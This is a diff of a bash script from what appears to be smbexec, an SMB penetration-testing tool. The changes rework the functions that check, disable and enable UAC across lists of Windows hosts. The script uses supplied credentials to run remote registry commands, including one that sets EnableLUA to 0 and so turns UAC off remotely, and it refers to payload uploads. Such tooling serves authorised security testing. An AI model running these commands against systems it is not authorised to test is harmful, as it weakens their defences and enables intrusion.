@@ -440,7 +440,11 @@ f_smb_login
 f_uac_setup(){
 f_banner	
 p=
-if [[ -e "$logfldr/host.lst.$(echo $range | cut -d"/" -f1)" ]]; then p="[$logfldr/host.lst.$(echo $range | cut -d"/" -f1)]"; fi
+
+if [[ -e "$logfldr/host.lst.$(echo $range | cut -d"/" -f1)" ]]; then
+	p="[$logfldr/host.lst.$(echo $range | cut -d"/" -f1)]"
+fi
+
 read -e -p " Target IP or host list $p: " tf
 if [ -z $tf ]; then tf="$logfldr/host.lst.$(echo $range | cut -d"/" -f1)"; fi
 
@@ -452,31 +456,45 @@ if [[ $tf =~  ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
     else
 	    echo -en "   Invalid IP or file does not exist.\n"
 	    sleep 3
-	    f_uac_sys_check
+	    f_uac_setup
     fi
 
 f_smbauth
 
-if [ "$sysenumchoice" == "5" ];then
-	f_uac_check
-	if [ -e /tmp/smbexec/uac_enabled.lst.tmp ];then
-		mv /tmp/smbexec/uac_enabled.lst.tmp $logfldr/uac_enabled.lst
+for i in $(cat $RHOSTS); do
+	#Check proper auth to system first, if no auth...no reason to continue....
+	$smbexecpath/smbexeclient //$i/C$ -A /tmp/smbexec/smbexec.auth -c showconnect >& /tmp/smbexec/connects.tmp 
+
+	f_smbauthinfo
+	if [ "$sysenumchoice" == "5" ] && [ -s /tmp/smbexec/success.chk ] && [ -z "$badshare" ];then
+		f_uac_check
+	elif [ "$sysexpchoice" == "3" ] && [ -s /tmp/smbexec/success.chk ] && [ -z "$badshare" ]; then
+		f_disable_uac
+	elif [ "$sysexpchoice" == "4" ] && [ -s /tmp/smbexec/success.chk ] && [ -z "$badshare" ]; then
+		f_enable_uac
+	else
+		f_smbauthresponse
+		sleep 2
 	fi
-elif [ "$sysexpchoice" == "3" ]; then
-	f_disable_uac
-elif [ "$sysexpchoice" == "4" ]; then
-	f_enable_uac
+	#Have to unset these because we're in a for loop
+	unset logonfail
+	unset connrefused
+	unset badshare
+	unset unreachable
+done
+
+if [ -e /tmp/smbexec/uac_enabled.lst.tmp ];then
+	mv /tmp/smbexec/uac_enabled.lst.tmp $logfldr/uac_enabled.lst.$DATE
 fi
 
-#f_freshstart
+f_freshstart
 f_mainmenu
 
 }
 
 f_uac_check(){
-for i in $(cat "$RHOSTS"); do
 	# Check to see if UAC is enabled on the system
-	$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "CMD /C reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA" &> /tmp/smbexec/uac.check.tmp
+	$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "CMD /C reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA" &> /tmp/smbexec/uac.check.tmp
 	uac_enabled=$(cat /tmp/smbexec/uac.check.tmp | grep -o "0x1")
 	if [ ! -z "$uac_enabled" ]; then
 		echo -e "\n\e[1;33m[*] UAC is enabled on $i\e[0m"
@@ -486,13 +504,11 @@ for i in $(cat "$RHOSTS"); do
 		echo -e "\n\e[1;33m[*] UAC does not appear to be enabled on $i\e[0m"
 		sleep 1
 	fi
-done
 
 }
 
 
 f_disable_uac(){
-for i in $(cat "$RHOSTS"); do
 	$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "CMD /C reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f" &> /tmp/smbexec/uac_disable.tmp
 	disable_success=$(cat /tmp/smbexec/uac_disable.tmp | grep -o "successfully")
 	if [ ! -z $disable_success ]; then
@@ -502,11 +518,9 @@ for i in $(cat "$RHOSTS"); do
 		echo -e "\n\e[1;31m[-] Could not disable UAC on $i.\e[0m"
 		sleep 1
 	fi
-done
 }
 
 f_enable_uac(){
-for i in $(cat "$RHOSTS"); do
 	$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "CMD /C reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f" &> /tmp/smbexec/uac_enable.tmp
 	enable_success=$(cat /tmp/smbexec/uac_enable.tmp | grep -o "successfully")
 
@@ -517,7 +531,6 @@ for i in $(cat "$RHOSTS"); do
 		echo -e "\n\e[1;31m[-] Could not enable UAC on $i.\e[0m"
 		sleep 1
 	fi
-done
 
 }
 
@@ -963,11 +976,11 @@ f_smbauth(){
 
 f_smbauthinfo(){
 	cat /tmp/smbexec/connects.tmp | grep "//$i" > /tmp/smbexec/success.chk
-	logonfail=$(cat /tmp/smbexec/connects.tmp | grep -i "NT_STATUS_LOGON_FAILURE")
-	connrefused=$(cat /tmp/smbexec/connects.tmp | grep -i "NT_STATUS_CONNECTION_REFUSED")
-	badshare=$(cat /tmp/smbexec/connects.tmp | egrep -i 'NT_STATUS_BAD_NETWORK_NAME|NT_STATUS_OBJECT_PATH_NOT_FOUND')
-	unreachable=$(cat /tmp/smbexec/connects.tmp | grep -i "NT_STATUS_HOST_UNREACHABLE")
-	accessdenied=$(cat /tmp/smbexec/connects.tmp | grep -i "NT_STATUS_ACCESS_DENIED")
+	logonfail=$(cat /tmp/smbexec/connects.tmp | grep "NT_STATUS_LOGON_FAILURE")
+	connrefused=$(cat /tmp/smbexec/connects.tmp | grep "NT_STATUS_CONNECTION_REFUSED")
+	badshare=$(cat /tmp/smbexec/connects.tmp | egrep 'NT_STATUS_BAD_NETWORK_NAME|NT_STATUS_OBJECT_PATH_NOT_FOUND')
+	unreachable=$(cat /tmp/smbexec/connects.tmp | grep "NT_STATUS_HOST_UNREACHABLE")
+	accessdenied=$(cat /tmp/smbexec/connects.tmp | grep "NT_STATUS_ACCESS_DENIED")
 }
 
 f_smbauthresponse(){
@@ -985,8 +998,8 @@ f_smbauthresponse(){
 			echo -e "\e[1;32m[+] Authentication to $i successful...\e[0m"
 			uploadpayload=1
 		else
-			echo -e "\e[1;33m[*] I'm not sure what happened, supplying output...\e[0m"
-			cat /tmp/smbexec/connects.tmp | egrep -i 'error|fail'
+			echo -e "\e[1;33m[*] I'm not sure what happened on $i, supplying output...\e[0m"
+			cat /tmp/smbexec/connects.tmp | egrep 'Error:|failed:'
 		fi	
 
 }
@@ -1184,7 +1197,7 @@ f_cleanup(){
 
 f_freshstart(){
 
-rm -rf /tmp/smbexec/ # cleanup all the stuff we put in the temp dir
+ rm -rf /tmp/smbexec/ # cleanup all the stuff we put in the temp dir
 
 # unset variables to prevent problems in the loop
 vars="badshare cemptyrpath ConnCheck connrefused enumber i isadmin lhost listener logonfail LPATH machine mainchoice oddshare onelettershare p paychoice payload port rcpath RHOSTS RPATH seed SHARERHOSTS SMBDomain SMBFilename SMBHASH SMBPass SMBUser superoddshare tf unreachable datatable linktable check_for_da sysenumchoice sysexpchoice"
